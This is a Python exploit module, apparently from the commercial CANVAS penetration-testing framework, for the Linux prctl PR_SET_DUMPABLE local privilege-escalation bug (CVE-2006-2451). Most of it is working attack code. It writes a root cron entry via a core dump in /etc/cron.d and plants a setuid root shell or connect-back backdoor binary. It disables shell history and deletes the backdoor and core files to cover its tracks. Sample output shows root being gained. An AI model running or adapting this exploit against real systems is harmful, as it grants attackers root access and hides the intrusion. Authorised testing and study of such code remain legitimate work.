#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit

from ExploitTypes.localexploit import LocalExploit

TODO = """

  - update NOTES
  - we could clean root $MAIL once exploited
  - check data public
  - check path before write bdfile

"""

NAME="DSU"
DESCRIPTION="prctl PR_SET_DUMPABLE Linux Local (2.6.13 < 2.6.17.4)"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Linux"
DOCUMENTATION["Date public"]="07-07-2006"
DOCUMENTATION["CVE Name"] = "CVE-2006-2451"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-2451"
DOCUMENTATION['CVSS'] = 4.6

VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
#                              only proc supported by MOSDEFlibc
PROPERTY['ARCH'] = [ ["Linux", "_all", "i386", "sparc", "ppc", "mips", "_parisc", "_arm"] ]
PROPERTY['VERSION'] = [ ] #example - please fill in yourself
PROPERTY['KERNELVER']  = ["2.6.12.9", "2.6.17.3"]

NOTES=""" 
The actual bug is this: prctl(PR_SET_DUMPABLE,2,0,0,0) allows you to
drop a core into your cwd that only root can read. This is a "security"
feature in 2.6 kernels introduced in (some 2.6.12.9) 2.6.13.

Removed in 2.6.17.4 by RedHat Security Team.
Working in 2.6.17.2

To exploit it we mmap a page of memory at PAGESIZE, then
fill that with an exploit string and then dump core.

The exploit string we choose is a \n<cron information>\n, and we chdir() into
/etc/cron.d/ so cron will read it for us. Cron will ignore the elf information
on the first page. Of course you have to make sure the path that cron.d reads
is correct. On some distributions it's /var/run/cron, etc.

This is a cross platform vulnerability.

http://www.kernel.org/git/?p=linux/kernel/git/stable/linux-2.6.17.y.git;a=commitdiff;h=0af184bb9f80edfbb94de46cb52e9592e5a547b0

Example commandline usage on Linux MOSDEF node:

Linux/MOSDEF$ runmodule DSU -v0 -t127.0.0.1
[C] Running module: DSU

[C] Args: -v0 -t127.0.0.1
Loading DSU ...                                                          [ ok ]
[C] ID: 0 Setinfo: > DSU (in progress) <
[C] prctl ok.
[C] RLIMIT_CORE before: [0L, 4294967295L]
[C] setrlimit result: 0
[C] RLIMIT_CORE after: [8192L, 8192L]
[C] prctl ok.
[C] mmap result: 0x1000
[C] chdir ok.
[C] connectback ELF size: 2998
[C] /dev/shm/0wn3d opened as fd=5
[C] file wrote successfully
[C] strcpy ok.
[C] fork result: 4830
[C] kill worked.
[C] Segmentation fault (core dumped)
[C] waiting 20sec... (0)
[C] waiting 20sec... (1)
[C] waiting 20sec... (2)
[C] ROOOOOOOOOOOOOOOOOOT
[C] Self.fd=4
[C] Set up Linux dynamic linking assembly component server
Initialized sendint with fd=4
[C] Initialized Local Functions.
[C] Resetting signal handlers...
[C] Reset sigchild
[C] Getting UIDs
[C] backdoor file removed.
[C] coredump file removed.
[C] Done.
[C] ID: 0 Setinfo: > DSU Done <
[C] UID=0 EUID=0 GID=0 EGID=0
Linux/MOSDEF#

"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.crondir = "/etc/cron.d"
        self.__pagesizes_cache = {}
        self.method = 3
        self.forkpid = 0

    def getargs(self):
        self.user=self.argsDict.get("user",self.user)
    
    def dsu_getpagesize(self, node):
        if not self.__pagesizes_cache.has_key(node):
            self.__pagesizes_cache[node] = node.shell.getpagesize()
        return self.__pagesizes_cache[node]

    def dsu_run(self, node):
        self.dsu_setrlimit(node)
        self.dsu_prctl(node)
        mapaddr = self.dsu_mmapclr(node)
        if not mapaddr:
            return 0
        
        # chdir to /etc/cron.d
        if not self.dsu_chdir(node, self.crondir):
            return 0
        
        # switch on method
        return getattr(self, "dsu_meth%d" % self.method)(node, mapaddr)
        
    def dsu_meth1(self, node, mapaddr):
        # XXX TODO: use makelinuxexe() here in case no gcc on remote
        
        self.log("[!] *** on success there will be a 4777 root:root /tmp/OWNED root shell")
        
        # strcpy in the cron command
        echome  = ''
        echome += '#include <stdio.h>\\n#include <sys/types.h>\\n#include <unistd.h>\\n'
        echome += 'int main(void) { char *shell[2] = { \\"/bin/sh\\", NULL};'
        echome += 'char *env[2] = { \\"HISTFILE=/dev/null\\", NULL}; setuid(0);'
        echome += 'setgid(0); execve(shell[0], shell, env);}'
        
        # commands to run
        cmds = ""
        cmds += "/bin/echo -e \"%s\" > /tmp/OWNED.c"%echome
        cmds += ";PATH=/usr/bin:$PATH gcc /tmp/OWNED.c -o /tmp/OWNED;touch /tmp/OWNED" # in case gcc fails
        cmds += ";chmod 4777 /tmp/OWNED"
        cmds += ";/bin/rm /tmp/OWNED.c"
        
        self.dsu_strcpy(node, mapaddr, "\n* * * * * root %s\n\0"%cmds)
        
        # fork and dump core
        self.dsu_forkdump(node)
        
        self.log("[!] *** don't forget to rm %s/core and /tmp/OWNED"%self.crondir)
        self.log("[!] *** it may take a while for /tmp/OWNED to appear (give it 2 minutes max)")

        # XXX todo...

        # what is missing:
        # - upload a trojan? or something
        # - fork and check if trojan got executed
        # - execve trojan maybe to get Suid privileges, but staying in MOSDEF.
    
    def dsu_meth2(self, node, mapaddr, bdfile = "0wn3d"):
        bdfile = self.get_writex_dir(node) + '/' + bdfile
        port = self.dsu_meth2_bindsocket(node)
        self.log("binding on port %d" % port)
        self.dsu_meth2_preparebackdoor(node, mapaddr, port, bdfile)
        r = self.dsu_forkdump(node)
        if not r:
            self.log("kill failed.")
            return 0
        self.log("Segmentation fault (core dumped)")
        fd = node.shell.accept(self.bindsock)
        if fd == -1:
            return 0
        self.log("y0 who is here?!")
        r = node.shell.close(self.bindsock)
        if r == -1:
            self.log("error trying to close listening socked.")
        self.log("listening socket closed.")
        r = node.shell.unlink(bdfile)
        if r == -1:
            self.log("could'nt remove backdoor file (%s)." % bdfile)
        self.log("backdoor file removed.")
        return self.dsu_pwned(node, fd)

    def dsu_meth2_bindsocket(self, node):
        port = 60000
        while True:
            if port > 65535:
                return -1
            sock = node.shell.getListenSock('127.0.0.1', port)
            if sock >= 0:
                break
            port += 1
        self.bindsock = sock
        return port
    
    def dsu_meth2_preparebackdoor(self, node, mapaddr, port, bdfile):
        execode = self.make_remote_cback_binary(node, '127.0.0.1', port)
        self.upload_binary(node, execode, bdfile)
        self.dsu_meth23_magicstring(node, mapaddr, bdfile)
        
    def dsu_meth3_preparebackdoor(self, node, mapaddr, bdfile):
        execode = self.make_remote_escale_binary(node, bdfile)
        self.upload_binary(node, execode, bdfile)
        self.dsu_meth23_magicstring(node, mapaddr, bdfile)
        
    def dsu_meth23_magicstring(self, node, addr, command):
        # prepare magic string
        self.dsu_strcpy(node, addr, "\n* * * * * root %s\n\0" % command)
        return 1

    def upload_binary(self, node, code, filename):
        O_RDWR = node.shell.libc.getdefine('O_RDWR')
        O_CREAT = node.shell.libc.getdefine('O_CREAT')
        node.shell.unlink(filename)
        fd = node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        #if fd == -1:
        if fd < 0:
            self.log("couldn't open %s..." % filename)
            return 0
        self.log("%s opened as fd=%d" % (filename, fd))
        r = node.shell.write(fd, code)
        if r != 1:
            self.log("write failed.")
            return 0
        self.log("file wrote successfully")
        r = node.shell.close(fd);
        if r == -1:
            self.log("error while trying to close the fd")
    
    def make_remote_cback_binary(self, node, ipaddr, port):
        import socket
        #TODO: Add a os.path.join(canvasengine.canvasroot) here
        #since not everyone runs CANVAS from the our root directory
        code = file("backdoors/cback_mmap_rwx.c").read()
        vars = node.shell.libc.getdefines()
        vars['CBACK_PORT'] = port
        vars['CBACK_ADDR'] = str2int32(socket.inet_aton(ipaddr))
        return self.make_remote_binary(node, code, vars)

    def get_proc_mounts(self, node, filepath = "/proc/mounts"):
        infd = node.shell.open(filepath, node.shell.libc.getdefine('O_RDONLY'))
        if infd < 0:
            self.log("could not open /proc/mounts for noexec check")
            return ""
        ret,fs = node.shell.fstat(infd)
        if ret != 0:
            self.log("could not fstat /proc/mounts")
            return ""
        rsize = fs['st_size']
        self.log("/proc/mounts size: %d bytes (0 size reads untill EOF)"% rsize)
        if rsize == 0: 
            rsize = -1 # XXX: read untill EOF
        mounts = node.shell.readfromfd(infd, rsize)
        self.log("read %d bytes"% len(mounts))
        node.shell.close(infd)
        return mounts

    def get_writex_dir(self, node, search = True):

        self.log("finding rwx basedirs for binary placement ..")
        dirchecks = [ "/dev/shm", "/tmp"]

        uid, euid, gid, egid = node.shell.ids()

        # XXX: replace this with our own getdents(2)/access(2) 
        if search == True:

            # XXX: not all finds support -readable -writable -executable access(2) checks :(
            # XXX: so we just find dirs .. and then do our own stat checks .. should switch
            # XXX: to using access(2) .. but stat will do for now

            # XXX: for now we just want it to find any dirs that belong to us .. 
            finddirs = node.shell.runcommand("/usr/bin/find / -maxdepth 2 -type d -uid %d"% uid)

            finddirs = finddirs.split('\n')
            for dir in finddirs:
                if 'Permission denied' not in dir and '/proc' not in dir and dir != "":
                    self.log("adding found base dir of %s to dir checks .."% dir)
                    dirchecks.append(dir)
                
        dirbase = []
        # NOEXEC mount checks .. filters out anything that's mounted noexec
        mounts = self.get_proc_mounts(node)
        if mounts != "":
            # filter out any noexec mountded dirs
            mounts = mounts.split('\n')
            for dir in dirchecks:
                noexec = False
                for mount in mounts:
                    if dir in mount and 'noexec' in mount:
                        self.log("%s is mounted noexec .. skipping"% dir)
                        noexec = True
                if noexec == False:
                    #self.log("%s passed noexec check .. adding to dirbase"% dir)
                    dirbase.append(dir)
        else:
            self.log("could not get /proc/mounts .. hoping for the best ..")
            dirbase = dirchecks

        writexFound = False
        #print dirbase
        for dir in dirbase:
            ret, st = node.shell.stat(dir)
            if ret != 0:
                continue
            self.log("got writex mode: %o for dir: %s"% (st['st_mode'], dir))
            # convert to unsigned octal
            perms = "%o"% st['st_mode']
            # check if it's +rwx for our perms
            if st['st_uid'] == uid or st['st_uid'] == euid:
                self.log("uid match .. checking perms for user !")
                # if rwx for user;break
                if perms[len(perms)-3] == '7':
                    writexFound = True
                    break
            if st['st_gid'] == gid or st['st_gid'] == egid:
                self.log("gid match .. checking perms for group !")
                # if rwx for gid;break
                if perms[len(perms)-2] == '7':
                    writexFound = True
                    break
            # otherwise check world perms
            self.log("[!] checking world perms ..")
            # if rwx for world; break
            if perms[len(perms)-1] == '7':
                writexFound = True
                break
        if writexFound == False:
            self.log("DID NOT FIND A WRITEX DIR !!! .. defaulting to /dev/shm ..")
            dir = "/dev/shm"
        return dir
                    
    def dsu_meth3(self, node, mapaddr, bdfile = "0wn3d"):
        # XXX TODO check if dirname(bdfile) is +rwx (and mountpoint too)
        # XXX: done

        bdfile = self.get_writex_dir(node) + '/' + bdfile

        self.dsu_meth3_preparebackdoor(node, mapaddr, bdfile)
        ret, st = node.shell.stat(bdfile)
        if ret == -1 or st == None:
            self.log("error trying to stat %s" % bdfile)
            return 0
        ctime = st['st_ctime']
        
        r = self.dsu_forkdump(node)
        if not r:
            self.log("kill failed.")
            return 0
        self.log("Segmentation fault (core dumped)")
        
        # check if the coredump is here
        # we dont return here (/etc/cron.d dir not readable by user)
        ret, st = node.shell.stat(self.crondir + "/core")
        if ret == -1 or st == None:
            self.log("weird, could not get info about the coredump... trying core.pid style")
            ret, st = node.shell.stat(self.crondir + "/core.%d"% self.forkpid)
            if ret == -1 or st == None:
                self.log("weird, still could not get info about the coredump... kernel is probably not vulnerable")
            else:
                self.log("core.%d dump exists!"% self.forkpid)
        else:
            self.log("core dump exists!")

        # loop until we have our rootshell
        S_ISUID = 0x800
        waittime = 20
        maxtry = 24 * 3600 / waittime
        import time
        self.log( "Entering a loop where we will go round %d times :) - Press the Stop Exploit button if you get bored "%(maxtry) )
        for i in range(0, maxtry):
            
            ##Has the user got bored and pressed halt ?
            if self.state == self.HALT:
                self.log('Halt detected, exiting ....')
                return 0
            
            ret, st = node.shell.stat(bdfile)
            if ret == -1 or st == None:
                self.log("error trying to stat %s" % bdfile)
                return 0
            if st['st_mode'] & S_ISUID and st['st_uid'] == 0:
                break
            if ctime != st['st_ctime']:
                self.log("WARNING: file modified, but no SUID... error?!")
                return 0
            self.log("waiting %dsec... (%d)" % (waittime, i))
            time.sleep(waittime)
        if i == maxtry:
            self.log("too bad, maxtry reached :(")
            return 0
        self.log("ROOOOOOOOOOOOOOOOOOT")
        
        # priviledge escalation
        r = node.shell.execve(bdfile, ["mos'def!"], ["HISTFILE=/dev/null"])
        
        # back to the readexec_loop, let's reconfigure that node.
        node.shell.restart()
        
        # sanitizing
        r = node.shell.unlink(bdfile)
        if r == -1:
            self.log("could'nt remove backdoor file (%s)." % bdfile)
        else:
            self.log("backdoor file removed.")
        r = node.shell.unlink(self.crondir + "/core")
        if r == -1:
            self.log("could'nt remove coredump file .. trying core.pid style")
            r = node.shell.unlink(self.crondir + "/core.%d"% self.forkpid)
        else:
            self.log("coredump file removed.")
        
        self.log("Done.")
        self.setInfo("%s Done" % self.name)
        self.setSucceeded()
        self.log(node.shell.getids())
        return node

    def make_remote_escale_binary(self, node, filename):
        code = file("backdoors/mosdef_escale_666.c").read()
        vars = node.shell.libc.getdefines()
        vars['SOCK'] = int(node.shell.fd)
        vars['FILENAME'] = filename
        return self.make_remote_binary(node, code, vars)
    
    def make_remote_binary(self, node, code, vars):
        #clear function cache must be done before any
        #shell.compile() is called for threading reasons
        #it also clears any intermediate compilations that were done
        #for example, if someone has already done a #include sendint then
        #we don't recompile that on a per-shellcode basis
        #so for every time you do a binary code, you need to clear
        #out the "we've already done sendint" cache
        #-dave
        node.shell.clearfunctioncache() # XXX: clears out vars ?
        #node.shell.compile() will also call a thread RLock.release()
        bincode = node.shell.compile(code, vars)
        #node.shell.leave()
        #print shellcode_dump(bincode)
        from MOSDEF.makeexe import makelinuxexe
        binexe = makelinuxexe(bincode, proc = node.shell.arch.upper() )
        self.log("connectback ELF size: %d" % len(bincode))
        #print shellcode_dump(binexe)
        return binexe
    
    def dsu_setrlimit(self, node):
        PAGE_SIZE = self.dsu_getpagesize(node)
        RLIMIT_CORE = node.shell.libc.getdefine('RLIMIT_CORE')
        ret = node.shell.getrlimit(RLIMIT_CORE)
        if ret == []:
            self.log("getrlimit() error");
            return -1
        self.log("RLIMIT_CORE before: %s" % ret)
        retval = node.shell.setrlimit(RLIMIT_CORE, [PAGE_SIZE * 2, PAGE_SIZE * 2])
        self.log("setrlimit result: %x" % retval)
        ret = node.shell.getrlimit(RLIMIT_CORE)
        if ret == []:
            self.log("getrlimit() error");
            return -1
        self.log("RLIMIT_CORE after: %s" % ret)
        return retval
    
    def dsu_prctl(self,node):
        #I'm assuming this works.
        PR_SET_DUMPABLE = node.shell.libc.getdefine('PR_SET_DUMPABLE')
        r = node.shell.prctl(PR_SET_DUMPABLE, 2)
        if r == -1:
            self.log("error with prctl()...")
            return 0
        self.log("prctl ok.")
        return 1
        
    def dsu_chdir(self, node, path):
        r = node.shell.chdir(path)
        if r == -1:
            self.log("couldn't chdir to %s..." % path)
            return 0
        self.log("chdir ok.")
        return 1

    def dsu_kill(self, node, pid, sig):
        r = node.shell.kill(pid, sig)
        if r:
            self.log("kill returnd %d" % r)
            return 0
        self.log("kill worked.")
        return 1

    def dsu_SEGV(self, node, pid):
        SIGSEGV = node.shell.libc.getdefine('SIGSEGV')
        return self.dsu_kill(node, pid, SIGSEGV)
    
    def dsu_forkdump(self, node):
        pid = self.dsu_fork(node)
        return self.dsu_SEGV(node, pid)
     
    # something weird still, getting 0 result as if we were child
    def dsu_fork(self, node):
        ret = node.shell.fork()
        self.forkpid = ret # XXX: for core.pid style dumps
        self.log("fork result: %d" % ret)
        return ret

    def dsu_strcpy(self, node, outstr, instr):
        r = node.shell.strcpy(outstr, instr)
        if r:
            self.log("weird strcpy() result: %d" % r)
            return 0
        self.log("strcpy ok.")
        return 1
    
    def dsu_mmapclr(self, node):
        PAGE_SIZE = self.dsu_getpagesize(node)
        PROT_READ = node.shell.libc.getdefine('PROT_READ')
        PROT_WRITE = node.shell.libc.getdefine('PROT_WRITE')
        MAP_PRIVATE = node.shell.libc.getdefine('MAP_PRIVATE')
        MAP_ANONYMOUS = node.shell.libc.getdefine('MAP_ANONYMOUS')
        MAP_FIXED = node.shell.libc.getdefine('MAP_FIXED')
        MAP_FAILED = node.shell.libc.getdefine('MAP_FAILED')
        p = node.shell.mmap(PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0)
        self.log("mmap result: 0x%x" % p)
        if p == MAP_FAILED:
            return 0
        node.shell.memset(p, 0, PAGE_SIZE)
        return p
    
    def dsu_pwned(self, node, fd):
        self.log("Done.")
        self.setSucceeded()
        from linuxNode import linuxNode
        newnode = linuxNode()
        node.newNode(newnode)
        newnode.parentnode = self.argsDict["passednodes"][0]
        #from MOSDEFShellServer import MosdefShellServer
        #linuxMosdefShellServer = MosdefShellServer('Linux', 'i386')
        linuxMosdefShellServer = node.shell.copy() # ex MosdefShellServer('Linux', 'i386')
        linuxMosdefShellServer(fd, newnode)
        self.log("Calling startup for MOSDEF shell server")
        newnode.startup()
        self.setInfo("%s Done" % self.name)
        return newnode
    
    def run(self):
        """
        This run happens on all nodes selected
        """
        #self.method = int(self.argsDict.get("method", self.method))
        self.setInfo("%s (in progress)"%(NAME))
        self.getargs()
        for node in self.argsDict["passednodes"]:            
            type = node.nodetype
            nodename=node.getname()
            caps= node.capabilities
            if "linux" not in caps:
                self.log("Node %s not a Linux node..."%nodename)
                continue
            else:
                result = self.dsu_prctl(node)
                if not result:
                    self.log("Not vulnerable to prctl. This is possible because many distros did not merge the prctl bug into their kernel tree, unfortunately")
                    continue
                return self.dsu_run(node)

        return 0

if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"
    
